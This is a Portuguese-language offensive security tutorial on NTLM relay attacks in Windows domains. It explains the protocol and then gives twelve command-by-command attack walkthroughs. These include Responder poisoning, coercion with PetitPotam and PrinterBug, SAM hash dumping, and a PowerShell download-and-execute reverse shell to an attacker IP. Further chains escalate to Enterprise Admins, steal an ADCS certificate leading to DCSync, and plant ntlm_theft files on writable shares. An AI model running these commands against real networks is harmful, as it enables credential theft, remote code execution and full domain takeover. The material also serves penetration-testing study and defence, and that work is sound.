---
layout: cyber
section: lateral
title: "Ataques NTLM Relay"
---

# Ataques NTLM Relay

# O que é?

NTLM (NT LAN Manager) é uma família de protocolos de autenticação challenge-response
desenvolvida pela Microsoft, funcionando como predecessor do Kerberos em ambientes
Windows. A família inclui três versões com características distintas:

- **LM (LAN Manager)**: protocolo original dos anos 80/90, baseado em DES, considerado
  obsoleto e trivialmente quebrável. Hashes LM são armazenados em uppercase e divididos
  em dois blocos de 7 caracteres — facilitando ataques de força bruta paralelos.

- **NTLMv1**: usa o hash NT (MD4 da senha em UTF-16-LE) como material de chave para
  uma função de resposta baseada em DES sobre o server challenge. O hash NT é calculado
  como: `NT hash = MD4(UTF16-LE(password))`. Mais seguro que LM, mas vulnerável a
  ataques de relay e quebra offline.

- **NTLMv2**: versão moderna, usa HMAC-MD5 como função de resposta. Incorpora timestamp
  e um client challenge gerado aleatoriamente, além do server challenge. A resposta
  completa é: `HMAC-MD5(NT Hash, username + domain + server_challenge + client_challenge
  + timestamp)`. Mais resistente a ataques offline, mas ainda vulnerável a relay.

A especificação oficial é o **MS-NLMP** (NT LAN Manager Authentication Protocol),
disponível publicamente na documentação da Microsoft. NTLM é implementado via SSPI
(Security Support Provider Interface) como o provedor `NTLMSSP`.

**Característica fundamental**: NTLM é um protocolo *embarcado* — não tem sua própria
camada de rede. Qualquer protocolo com camada de transporte definida (SMB, HTTP, LDAP,
MSSQL) pode carregar mensagens NTLM. Isso é o que torna o relay cross-protocol possível.

**Ausência de autenticação mútua**: diferente do Kerberos, o NTLM não verifica a
identidade do servidor — apenas o servidor autentica o cliente. O cliente envia sua
resposta ao desafio sem ter garantia de que está falando com o servidor legítimo. Este
é o defeito de design fundamental que possibilita todos os ataques de relay.

# Onde é implementado?

NTLM está presente em praticamente qualquer ambiente Windows e é ativado por padrão
como mecanismo de fallback quando Kerberos não é viável. Cenários onde NTLM é usado:

**Casos de uso legítimos que forçam NTLM:**

- **Conexão por endereço IP** (não hostname): Kerberos requer o hostname para resolução
  do SPN. Qualquer acesso via `\\192.168.1.10\share` usa NTLM automaticamente, mesmo
  em domínios AD perfeitamente configurados.

- **Serviço sem SPN registrado**: se um serviço não tem um Service Principal Name no
  AD, o cliente recorre a NTLM como fallback.

- **Sistemas standalone (workgroup)**: máquinas fora de domínio não têm como usar
  Kerberos. Todo acesso remoto usa NTLM para autenticação.

- **Domínios não confiáveis ou sem trust configurado**: comunicação cross-domain sem
  trust estabelecido cai para NTLM.

- **SMB para compartilhamentos de arquivo**: mesmo em ambientes AD, o SMB aceita e
  frequentemente negocia NTLM, especialmente em acessos entre workstations onde
  Kerberos não foi forçado por GPO.

- **HTTP/Negotiate em IIS**: o esquema Negotiate tenta Kerberos primeiro, mas recai
  em NTLM quando Kerberos falha — o que acontece com frequência em acessos via IP,
  em navegadores que não enviaram o ticket correto, ou em sites sem SPN configurado.

- **LDAP em alguns cenários**: autenticação NTLM em LDAP é aceita por padrão em DCs
  sem LDAP signing obrigatório configurado.

- **Serviços legados**: aplicações corporativas antigas, scanners, sistemas ERP de
  gerações anteriores, frequentemente hardcoded para usar NTLM.

**Onde NTLM está desabilitado:**

Apenas em ambientes ativamente endurecidos via GPO (Restrict NTLM policies) ou em
organizações que migraram completamente para Kerberos com enforcement. Na prática,
menos de 5% dos ambientes corporativos têm NTLM completamente desabilitado.

# Como funciona de forma adequada?

O fluxo NTLM legítimo é um handshake de 3 mensagens entre cliente, servidor e
Domain Controller (para validação):

```
Cliente                    Servidor                       DC (Netlogon)
   |                           |                              |
   |--- NEGOTIATE_MESSAGE ---->|                              |
   |    [NegotiateFlags]       |                              |
   |    [Workstation]          |                              |
   |    [DomainName]           |                              |
   |                           |                              |
   |<-- CHALLENGE_MESSAGE -----|                              |
   |    [NegotiateFlags]       |                              |
   |    [ServerChallenge: 8B]  |                              |
   |    [TargetName]           |                              |
   |    [TargetInfo: MsvAv*]   |                              |
   |                           |                              |
   |--- AUTHENTICATE_MESSAGE ->|                              |
   |    [NtChallengeResponse]  |                              |
   |    [LmChallengeResponse]  |--- NetrLogonSamLogon ------->|
   |    [DomainName]           |    [LogonInfo]               |
   |    [UserName]             |                              |
   |    [Workstation]          |<-- ValidationInfo -----------|
   |    [SessionKey]           |    [UserSID, GroupSIDs]      |
   |                           |    [LogonHours, etc]         |
   |<-- Session estabelecida --|                              |
```

**Mensagem 1 — NEGOTIATE_MESSAGE** (`MessageType = 0x00000001`):
- Enviada pelo cliente para iniciar o fluxo de autenticação
- Anuncia ao servidor quais capacidades NTLM suporta via `NegotiateFlags` (32 bits)
- Flags relevantes: `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY`, `NTLMSSP_NEGOTIATE_SIGN`,
  `NTLMSSP_NEGOTIATE_SEAL`, `NTLMSSP_NEGOTIATE_NTLM`, `NTLMSSP_NEGOTIATE_56`, `NTLMSSP_NEGOTIATE_128`

**Mensagem 2 — CHALLENGE_MESSAGE** (`MessageType = 0x00000002`):
- Enviada pelo servidor ao cliente como desafio
- Contém `ServerChallenge`: nonce de 64 bits (8 bytes) gerado aleatoriamente pelo servidor
- Contém `NegotiateFlags` escolhidos dentre os oferecidos pelo cliente
- Contém `TargetInfo`: estrutura de pares atributo-valor (MsvAvNbDomainName, MsvAvNbComputerName,
  MsvAvDnsDomainName, MsvAvDnsComputerName, MsvAvTimestamp)
- Esta mensagem é o que ferramentas como DumpNTLMInfo.py e ntlm-info conseguem parsear
  para fingerprinting: versão do Windows, hostname, domínio, suporte a features

**Mensagem 3 — AUTHENTICATE_MESSAGE** (`MessageType = 0x00000003`):
- Enviada pelo cliente provando posse da chave secreta (hash da senha)
- Contém `NtChallengeResponse`: a resposta calculada usando o hash NT
- Contém `LmChallengeResponse`: resposta LM (vazia em NTLMv2 moderno)
- Contém identidade: usuário, domínio, workstation
- Contém `EncryptedRandomSessionKey`: chave de sessão cifrada para signing/sealing

**Cálculo do Hash NT (base de tudo):**
```
Senha: "Password123"
UTF-16-LE: 50 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00 31 00 32 00 33 00
MD4:       CC 36 CF 7A 8B 9B AB 3C E4 74 BB 80 88 F8 FD 73
NT Hash = CC36CF7A8B9BAB3CE474BB8088F8FD73
```

**Cálculo da Resposta NTLMv2:**
```
1. NTHash = MD4(UTF16LE(password))
2. NTHashv2 = HMAC-MD5(NTHash, UTF16LE(uppercase(user) + domain))
3. blob = {responserversion=1, hiresponserversion=1, timestamp, client_challenge, targetinfo}
4. NTLMv2Response = HMAC-MD5(NTHashv2, server_challenge + blob) + blob
```

**Por que NTLMv2 é mais seguro que NTLMv1:**
- Inclui `timestamp`: impede replay de respostas capturadas (válido apenas por uma janela de tempo)
- Inclui `client_challenge`: torna cada handshake único mesmo com o mesmo server challenge
- Usa HMAC-MD5 em vez de DES: função mais robusta criptograficamente
- Inclui `TargetInfo`: vincula a resposta ao servidor/domínio específico

**NTLM Session Security — Signing e Sealing:**
```
Signing (integridade):
  session_key = HMAC-MD5(NT_response, ResponseKeyNT)
  MAC = HMAC-MD5(session_key, sequence_number + message)
  Servidor verifica MAC — detecta adulteração de mensagem

Sealing (confidencialidade):
  Usa RC4 com derivados da session_key para cifrar mensagens
  Toda mensagem sealed também é signed (sealing implica signing)
```

**SMB Signing por padrão:**
```
Tipo de host               | Configuração padrão de Signing
---------------------------|--------------------------------
SMB2/3 Clients             | Not Required (pode negociar, não exige)
SMB2/3 Servers             | Not Required (aceita, não exige)
Domain Controllers         | Required    (exige em todas as conexões)
Windows 11 Insider         | Required    (Microsoft movendo para obrigatório)
```

**EPA — Extended Protection for Authentication:**
O EPA (RFC 5056) vincula a autenticação a um canal de transporte específico via
Channel Binding Token (CBT), que inclui o certificado TLS do servidor ou parâmetros
do canal TCP. Quando habilitado, previne relay porque o token de autenticação só é
válido para aquele canal específico — retransmitir a autenticação para outro servidor
resulta em falha, pois o CBT não bate com o canal do destino.

---

## Handshake de Três Mensagens: Negotiate, Challenge, Authenticate

### O Protocolo NTLM

NT LAN Manager (NTLM/MS-NLMP) e uma familia de protocolos de seguranca que inclui
LM, NTLMv1 e NTLMv2. Eles sao usados para autenticar usuarios remotos e opcionalmente
prover seguranca de sessao. O NTLM e um protocolo embarcado, o que significa que embora
tenha mensagens e maquina de estados proprios, ele nao tem uma camada de pilha de rede
propria — qualquer protocolo com camada definida na pilha de rede (SMB, HTTP(S), LDAP(S))
pode utiliza-lo.

NTLM e um protocolo challenge-response que usa nonces (numeros pseudo-aleatorios de
uso unico) como mecanismo defensivo contra replay attacks.

### Fluxo de Autenticacao NTLM (3 mensagens)

```
Cliente                    Servidor                      DC
  |                           |                           |
  |-- NEGOTIATE_MESSAGE ----> |                           |
  |                           |                           |
  |<-- CHALLENGE_MESSAGE ---- |                           |
  |    (ServerChallenge=64bit nonce)                      |
  |                           |                           |
  |-- AUTHENTICATE_MESSAGE -> |                           |
  |    (NtChallengeResponse)  |                           |
  |                           |-- NETLOGON_NETWORK_INFO ->|
  |                           |<-- NETLOGON_VALIDATION ---|
  |<-- Session estabelecida --|                           |
```

**Mensagem 1: NEGOTIATE_MESSAGE**
- Enviada pelo cliente ao servidor para iniciar autenticacao
- Contem `NegotiateFlags`: estrutura de 32 flags de 1 bit indicando
  quais capacidades NTLM o cliente suporta/solicita
- MessageType = 0x00000001 (NtLmNegotiate)

**Mensagem 2: CHALLENGE_MESSAGE**
- Enviada pelo servidor ao cliente para desafiar sua identidade
- Contem `NegotiateFlags`: flags que o servidor escolheu dentre as
  oferecidas pelo cliente no NEGOTIATE_MESSAGE
- Contem `ServerChallenge`: nonce de 64 bits gerado pelo servidor
- MessageType = 0x00000002 (NtLmChallenge)
- Ferramentas como DumpNTLMInfo.py, ntlm-info e NTLMRecon conseguem
  fazer reconhecimento parseando os campos do CHALLENGE_MESSAGE

**Mensagem 3: AUTHENTICATE_MESSAGE**
- Enviada pelo cliente ao servidor para provar posse da chave secreta compartilhada
- Contem `LmChallengeResponseFields` e `NtChallengeResponseFields`
- MessageType = 0x00000003 (NtLmAuthenticate)

### Calculo da Resposta NTLMv1

Para NTLMv1, a funcao `NTOWFv1` (NT one-way function) cria um hash baseado na
senha do usuario. O formato do hash capturado pelo Responder e:

```
User::HostName:LmChallengeResponse:NtChallengeResponse:ServerChallenge
```

Exemplo capturado:
```
[SMB] NTLMv1 Hash: Support1::WIN-OLMHXGAP0V2:e2dL319608f55fB6:Q49S19A2937...
```

### Calculo da Resposta NTLMv2

Para NTLMv2, as funcoes `NTOWFv2` e `LMOWFv2` sao utilizadas. O formato e:

```
User::Domain:ServerChallenge:Response:NTLMv2_CLIENT_CHALLENGE
```

Exemplo capturado:
```
[SMB] NTLMv2-SSP Hash: Support2::INLANEFREIGHT:e2d2339638fc5fd6:D4979A923DD76...
```

### NTLM Session Security: Signing e Sealing

**Message Signing (Assinatura):**
- Fornece integridade de mensagem
- Quando negociado, cliente e servidor negociam uma `session key` para assinar
  todas as mensagens trocadas
- A MAC (Message Authentication Code) e gerada aplicando algoritmo criptografico
  sobre a mensagem e a session key
- O servidor verifica a MAC usando o mesmo algoritmo

**Message Sealing (Criptografia):**
- Fornece confidencialidade via criptografia simetrica
- Garante que adversarios nao consigam ler ou alterar as mensagens
- No contexto NTLM, sealing implica signing (toda mensagem sealed tambem e signed)

**Configuracoes padrao de SMB signing:**

```
Host                    | Configuracao padrao
------------------------|--------------------
SMB1 Client             | Enabled
SMB1 Server             | Disabled
SMB2 & SMB3 Clients     | Not Required
SMB2 & SMB3 Servers     | Not Required
Domain Controllers      | Required
```

**Extended Protection for Authentication (EPA):**
- Baseado na RFC 5056, introduzido no Windows Server 2008
- Quando EPA esta habilitado, cliente e servidor estabelecem um canal seguro usando
  um `channel binding token` (CBT)
- O CBT vincula a autenticacao as caracteristicas especificas do canal (IP, porta),
  prevenindo replay em canal diferente
- Funciona com SMB e HTTP; requer que ambos os lados suportem

### Por Que o NTLM e Vulneravel a Relay

Toda a familia NTLM e suscetivel a relay attacks de servidores falsos porque nao
suporta autenticacao mutua — o cliente nao verifica se esta autenticando contra
o servidor legitimo. A sessao de seguranca SSPI trata o problema de integridade
via signing, mas nao resolve o relay em si.

Situacoes onde Kerberos nao pode ser usado (forçando uso de NTLM):
1. Compatibilidade com sistemas legados sem suporte a Kerberos
2. Configuracao de Kerberos incorreta no dominio
3. Servidor nao e membro do dominio (workgroup)
4. Protocolo escolhe suportar apenas NTLM

---

## Pre-requisitos e Quando Funciona

### Para Relay over SMB

O relay para SMB requer que o alvo tenha **SMB signing desabilitado**. Por padrao:
- Workstations Windows 10/11: signing NOT Required (vulneravel)
- Domain Controllers: signing Required (nao vulneravel diretamente via SMB)
- Windows 11 Insider editions: Microsoft comecou a enforcar signing por padrao

```
Restricao importante:
- Nao e possivel fazer relay de SMB NTLM para LDAP diretamente sem exploits especificos
  porque SMB suporta session signing e o DC pode requere-lo
- HTTP NTLM pode ser relayado para todos os protocolos sem restricoes de signing
  porque HTTP nao suporta session signing
```

### Para Relay over LDAP

- Funciona quando a autenticacao chega via HTTP (que nao tem session signing)
- Relay de SMB para LDAP normalmente falha porque o DC requer signing
- CVE-2019-1040 (Drop the MIC) permite bypassar session signing via manipulacao das
  mensagens NTLM (patched)
- CVE-2019-1166 (Drop the MIC 2) — variante similar (patched)
- CVE-2019-1019 (Your Session Key is my Session Key) — permite requisitar session key
  de qualquer autenticacao NTLM ao DC (patched)

### Para Relay over LDAP (AD CS - ESC8)

- Funciona sempre que um DC ou CA server aceita autenticacao HTTP sem EPA
- Permite obter certificado de maquina do DC via coercao
- Nao requer que SMB signing esteja desabilitado
- Esta e uma das tecnicas mais criticas: coercao do DC → relay para HTTP do AD CS
  → certificado do DC → autenticacao Kerberos como DC → DCSync → domain compromise

### Tabela de Compatibilidade de Relay

```
Auth recebida de | Relay para     | Cross-protocol? | Funciona?
-----------------|----------------|-----------------|----------
HTTP(S)          | HTTP(S)        | Nao             | Sim
HTTP(S)          | LDAP(S)        | Sim             | Sim
HTTP(S)          | SMBv1/2/3      | Sim             | Sim (signing off)
HTTP(S)          | MSSQL          | Sim             | Sim
SMBv1/2/3        | SMBv1/2/3      | Nao             | Sim (signing off)
SMBv1/2/3        | HTTP(S)        | Sim             | Sim
SMBv1/2/3        | LDAP(S)        | Sim             | Requer exploit (Drop MIC)
```

---

## Ferramentas Principais

### Responder

Responder e a ferramenta mais usada para a fase de pre-relay. E um poisoner LLMNR,
NBT-NS e MDNS com servidores rogue embutidos (HTTP(S), SMB, Kerberos, MSSQL, FTP, LDAP).
Captura hashes NTLMv1/NTLMv2/LMv2 e credenciais em texto claro quando disponiveis.

**Modos de operacao:**

```bash
# Modo analyze: observa requisicoes sem responder (recon)
sudo python3 Responder.py -I ens192 -A

# Modo poisoning: responde requisicoes broadcast para capturar/relay auth
sudo python3 Responder.py -I ens192

# Hashes capturados ficam em /logs/(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
```

**Configuracao para relay (desabilitar servidores que o ntlmrelayx vai assumir):**

```bash
# Desabilitar servidor SMB do Responder para usar ntlmrelayx no lugar
sed -i "s/SMB = On/SMB = Off/" Responder/Responder.conf
cat Responder.conf | grep -i smb
# SMB = Off

# Para relay HTTP, desabilitar HTTP tambem:
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
```

**Pretender** e uma alternativa moderna escrita em Go pela RedTeam Pentesting.
Obtem posicao MitM via spoofing de resolucao de nomes e ataques DHCPv6:

```bash
# Modo dry-run (apenas analisa, nao responde)
./Pretender --dry
```

### Impacket ntlmrelayx.py

ntlmrelayx e a ferramenta central para relay. Atua como servidor recebendo conexoes
dos clientes e as relayando para os alvos configurados.

**Flags principais:**

```
-t TARGET           Alvo unico (ex: smb://192.168.1.10)
-tf ARQUIVO         Arquivo com lista de alvos (um por linha)
--no-http-server    Desabilita o servidor HTTP interno
--no-smb-server     Desabilita o servidor SMB interno
-smb2support        Habilita suporte a SMBv2 (sempre usar)
-socks              Habilita proxy SOCKS para manter sessoes autenticadas ativas
-c "COMANDO"        Executa comando no alvo via SMB
-i                  Modo interativo - abre shell SMB por sessao estabelecida
-q "SQL QUERY"      Executa query SQL (para relay sobre MSSQL)
-l / --lootdir DIR  Diretório onde salvar arquivos de loot (LDAP dump etc)
--no-da             Nao tenta adicionar domain admin (relay LDAP)
--no-acl            Nao abusa de ACLs misconfigured (relay LDAP)
--add-computer NAME PASSWORD  Adiciona computador ao dominio via LDAP
--escalate-user USER          Tenta escalar privilegios do usuario via ACL abuse
--delegate-access             Configura RBCD no computador alvo
--no-multirelay               Relaya conexao apenas uma vez (1:1 vs M:M)
--remove-mic                  Bypass CVE-2019-1040 (Drop the MIC)
-debug              Modo verbose com informacoes de debug
```

**Esquemas de protocolo para -t e -tf:**

```
smb://IP              Relay sobre SMB (padrao se esquema omitido)
ldap://IP             Relay sobre LDAP
ldaps://IP            Relay sobre LDAPS
mssql://IP            Relay sobre MSSQL
http://IP             Relay sobre HTTP
https://IP            Relay sobre HTTPS
rpc://IP              Relay sobre RPC
all://IP              Relay sobre todos os protocolos disponiveis
smb://DOMAIN\\USER@IP Named target (relay apenas auth deste usuario)
```

**Multi-relay (comportamento padrao):**

```
Target Type              | Exemplo                              | Multi-relay padrao
-------------------------|--------------------------------------|-------------------
Single General Target    | -t 192.168.1.50                      | Desabilitado (1:1)
Single Named Target      | -t smb://DOMAIN\\USER@192.168.1.50   | Habilitado (M:M)
Multiple Targets (-tf)   | -tf targets.txt                      | Habilitado (M:M)
```

### Ferramentas de Enumeracao de Alvos

**RunFinger.py (incluido no Responder):**

```bash
python3 RunFinger.py -i 172.16.117.0/24
# Saida: [SMB2]:['172.16.117.3', Os:'Windows 10/Server 2016/2019', Signing:'True', RDP:'True']
```

**CrackMapExec:**

```bash
# Gerar lista de hosts com SMB signing desabilitado
crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt

# Verificar signing manualmente
crackmapexec smb 172.16.117.0/24
# SMB 172.16.117.50 445 WS01 (signing:False)(SMBv1:False) <- VULNERAVEL
# SMB 172.16.117.3  445 DC01 (signing:True)(SMBv1:False)  <- DC protegido
```

**Nmap:**

```bash
nmap -Pn --script=smb2-security-mode.nse -p 445 172.16.117.0/24 --open
# Host script results:
#   smb2-security-mode: 2.02:
#   |_  Message signing enabled and required     <- DC (protegido)
#   |_  Message signing enabled but not required <- Workstation (vulneravel)
```

---

## Na Pratica — Ataques Principais

### Fase I: Pre-relay (Coercao de Autenticacao)

A fase pre-relay foca em tecnicas para induzir/coagir o cliente a iniciar autenticacao
NTLM para um servico no adversario:

**AiTM via Poisoning (oportunista):**
```
Cliente tenta acessar \\SERVERR (typo)
  → DNS nao tem entrada para SERVERR
  → Windows broadcast via LLMNR: "Alguem conhece SERVERR?"
  → Responder responde: "Sim! SERVERR = <IP_ATACANTE>"
  → Cliente inicia autenticacao NTLM contra o atacante
  → ntlmrelayx relaya para os alvos configurados
```

**Authentication Coercion (forcada, nao oportunista):**

*PrinterBug (MS-RPRN) - SpoolSample:*
```bash
# Forca DC a autenticar contra nosso host via protocolo MS-RPRN (Print System Remote Protocol)
python3 SpoolSample.py DC01.INLANEFREIGHT.LOCAL ATTACKER_IP

# Ou usando Impacket
python3 printerbug.py DOMAIN/user:password@DC_IP ATTACKER_IP
```

*PetitPotam (MS-EFSRPC):*
```bash
# Forca autenticacao via protocolo de criptografia de arquivos EFS
# Pode funcionar sem credenciais em hosts vulneraveis
python3 PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP

# Com credenciais (mais confiavel)
python3 PetitPotam.py -u user -p password -d DOMAIN ATTACKER_IP DC_IP
```

*DFSCoerce (MS-DFSNM):*
```bash
python3 dfscoerce.py -u user -p password -d DOMAIN ATTACKER_IP DC_IP
```

*Coercer (ferramenta unificada de coercao):*
```bash
# Tenta multiplos metodos de coercao automaticamente
python3 Coercer.py coerce -u user -p password -d DOMAIN -l ATTACKER_IP -t DC_IP

# Modo scan: identifica quais metodos de coercao funcionam
python3 Coercer.py scan -u user -p password -d DOMAIN -t DC_IP
```

### Fase II: Relay

**Identificar alvos vulneraveis:**

```bash
crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
cat relayTargets.txt
# 172.16.117.50
# 172.16.117.60
```

### Fase III: Post-relay

Dependendo do protocolo relayado e das permissoes do usuario vitima, diferentes
ataques post-relay estao disponiveis:

```
Coercao      | Auth recebida | Relay para | Post-relay attack
-------------|---------------|------------|------------------
PrinterBug   | SMB           | SMB        | SAM dump, RCE, SOCKS
PetitPotam   | HTTP          | LDAP       | Domain enum, add computer, ACL abuse
WebDAV+Coer  | HTTP          | LDAP(S)    | Kerberos RBCD, Shadow Credentials
Qualquer     | HTTP          | HTTPS ADCS | Certificado de maquina → Domain pwn
```

---

## Exemplos de Codigo / Comandos

### 1. SMB Relay Classico — SAM Dump

```bash
# Terminal 1: Desabilitar servidor SMB do Responder
sed -i "s/SMB = On/SMB = Off/" Responder/Responder.conf

# Terminal 2: Iniciar Responder para poisoning
sudo python3 Responder.py -I ens192

# Terminal 3: Iniciar ntlmrelayx apontando para alvos com signing off
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support

# Quando usuario da rede digitar UNC errado ou um arquivo .lnk for acionado:
# [*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/PETER SUCCEED
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
```

### 2. SMB Relay — Execucao de Comandos (RCE)

```bash
# Execucao simples de ping para confirmar RCE
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c 'ping -n 1 172.16.117.30'

# Reverse shell via download e execucao de PowerShell
# Primeiro: servir o payload
python3 -m http.server 8000

# Segundo: listener
nc -nvlp 7331

# Terceiro: relay com payload de reverse shell
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"

# Resultado: shell como NT Authority\System
```

### 3. SMB Relay — SOCKS Proxy (manter sessoes)

```bash
# Iniciar ntlmrelayx com -socks para manter sessoes autenticadas
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

# Ver sessoes ativas
ntlmrelayx> socks
# Protocol  Target           Username              AdminStatus  Port
# SMB       172.16.117.50    INLANEFREIGHT/PETER   TRUE         445
# SMB       172.16.117.60    INLANEFREIGHT/RMONTY  FALSE        445

# Configurar proxychains
cat /etc/proxychains4.conf | grep socks4
# socks4  127.0.0.1  1080

# Usar sessao autenticada com qualquer ferramenta impacket
proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass
# nt authority\system

# Acessar share mesmo sem admin
proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass
```

### 4. SMB Relay — Shell Interativo

```bash
# -i cria shell SMB interativo por sessao (acessivel via nc)
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -i

# Output mostra porta local para cada sessao:
# [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
# Conectar com nc:
nc -nv 127.0.0.1 11000
# Type help for list of commands
# # shares
# ADMIN$, C$, Finance, IPC$
```

### 5. NTLM Relay para LDAP — Domain Enumeration

```bash
# Desabilitar HTTP e SMB do Responder (ntlmrelayx vai assumir)
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
sudo python3 Responder.py -I ens192

# Relay NTLM HTTP para LDAP no DC para dump do dominio
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

# Sucesso quando auth vem via HTTP (nao SMB):
# [*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/PETER SUCCEED
# [*] Domain info dumped into lootdir!

# Arquivos gerados:
ls ldap_dump/
# domain_computers_by_os.html  domain_computers.html  domain_groups.grep
# domain_groups.json  domain_policy.html  domain_trusts.grep
# domain_users.grep  domain_users.json  domain_users_by_group.html
```

### 6. NTLM Relay para LDAP — Criacao de Conta de Computador

```bash
# Criar conta de computador no dominio para usar em ataques subsequentes
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'ATTACKER$' 'Password123!'

# ntlmrelayx automaticamente usa LDAPS via StartTLS quando necessario:
# [*] Adding machine account to the domain requires TLS, but ldap:// scheme provided. Switching target to LDAPS via StartTLS
# [*] Adding new computer with username: ATTACKER$ and password: Password123! result: OK

# Usar nome e senha gerados aleatoriamente:
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'
# [*] Adding new computer with username: plaintext$ and password: o6@ekK5#rlw2rAe result: OK
```

### 7. NTLM Relay para LDAP — Escalacao de Privilegios via ACL Abuse

```bash
# Verificar se usuario relayado tem permissoes para escalar (ex: membro de SQL Admins
# que tem Full Control sobre Enterprise Admins)
sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug

# Output bem-sucedido:
# [+] Permission found: Full Control on CN=Enterprise Admins via CN=SQL Admins
# [*] User privileges found: Adding user to a privileged group (Enterprise Admins)
# [*] Adding user: plaintext to group Enterprise Admins result: OK
# [*] Privilege escalation successful, shutting down...
```

### 8. NTLM Relay para MSSQL (Cross-protocol)

```bash
# Relay SMB NTLM para MSSQL no servidor 172.16.117.60
sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks

# Com Responder rodando:
# [*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
# [*] SOCKS: Adding INLANEFREIGHT/NPORTS@172.16.117.60(1433) to active SOCKS connection

ntlmrelayx> socks
# MSSQL  172.16.117.60  INLANEFREIGHT/NPORTS  N/A  1433

# Acessar MSSQL via proxychains
proxychains4 -q mssqlclient.py INLANEFREIGHT/NPORTS@172.16.117.60 -windows-auth -no-pass

# Executar query diretamente no relay
sudo ntlmrelayx.py -t mssql://INLANEFREIGHT\\NPORTS@172.16.117.60 -smb2support -q "SELECT name FROM sys.databases;"
```

### 9. NTLM Relay para ADCS (ESC8) — Certificado do DC via PetitPotam

Esta e a cadeia mais poderosa: coercao do DC → relay HTTP → AD CS → certificado → Kerberos → Domain pwn

```bash
# Passo 1: Verificar se AD CS tem endpoint HTTP vulneravel
# Geralmente em http://CA_SERVER/certsrv/certfnsh.asp

# Passo 2: Iniciar ntlmrelayx apontando para endpoint HTTP do AD CS
# Requer --adcs flag e template de maquina
sudo ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# Passo 3: Coagir DC a autenticar contra nosso host
python3 PetitPotam.py -u user -p password -d DOMAIN ATTACKER_IP DC_IP
# Ou usar PrinterBug:
python3 printerbug.py DOMAIN/user:password@DC_IP ATTACKER_IP

# Resultado: ntlmrelayx obtem certificado .pfx do DC
# [*] Certificate: MIIRdQIBAzCCET8...

# Passo 4: Usar certificado para obter TGT do DC via PKINIT
python3 gettgtpkinit.py -pfx-base64 $(cat dc01.pfx | base64 -w 0) DOMAIN/DC01$ dc01.ccache

# Passo 5: Usar TGT para DCSync
export KRB5CCNAME=dc01.ccache
python3 secretsdump.py -k -no-pass DOMAIN/DC01$@DC01.DOMAIN.LOCAL
# Administrator:500:aad3...:32ed87bdb5f...:::
```

### 10. Relay com Delegacao de Acesso (RBCD via --delegate-access)

```bash
# Criar computador atacante e configurar RBCD no alvo
# Requer: auth NTLM do computador alvo, ntlmrelayx com --delegate-access

# Passo 1: Criar computador atacante
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'AttackerPass123!' DOMAIN/user:password

# Passo 2: Relay com --delegate-access apontando para o computador criado
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access --escalate-user 'ATTACKER$'

# Coagir host alvo a autenticar (PetitPotam, PrinterBug etc)
python3 PetitPotam.py -u user -p password ATTACKER_IP TARGET_HOST

# Passo 3: Usar S4U2Proxy para obter ticket como qualquer usuario do target
getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator DOMAIN/'ATTACKER$':'AttackerPass123!'
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```

### 11. Farming de Hashes via Shared Folders (Hash Coercion Passiva)

```bash
# Encontrar shares com permissao anonima de escrita
crackmapexec smb 172.16.117.0/24 -u anonymous -p '' --shares

# Gerar arquivos maliciosos para colocar no share
# ntlm_theft gera multiplos tipos de arquivo que forcam autenticacao
python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'
# Created: @myfile/@myfile.scf
# Created: @myfile/@myfile-(url).url
# Created: @myfile/@myfile.lnk
# Created: @myfile/@myfile.htm
# ... etc

# Copiar para o share acessivel
smbclient //172.16.117.3/smb -U anonymous% -c "put @myfile.lnk"

# Quando usuario abre a pasta, automaticamente autentica contra ATTACKER_IP
# Responder ou ntlmrelayx captura/relaya
```

### 12. NTLM Relay com Wildcards (All Protocols)

```bash
# Usar esquema all:// para relay em todos os protocolos simultaneamente
cat relayTargets.txt
# all://172.16.117.50
# all://172.16.117.60

# Desabilitar todos os servidores do Responder
sed -i '4,18s/= On/= Off/g' Responder.conf
sudo python3 Responder.py -I ens192

# ntlmrelayx acumula sessoes em multiplos protocolos via SOCKS
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

ntlmrelayx> socks
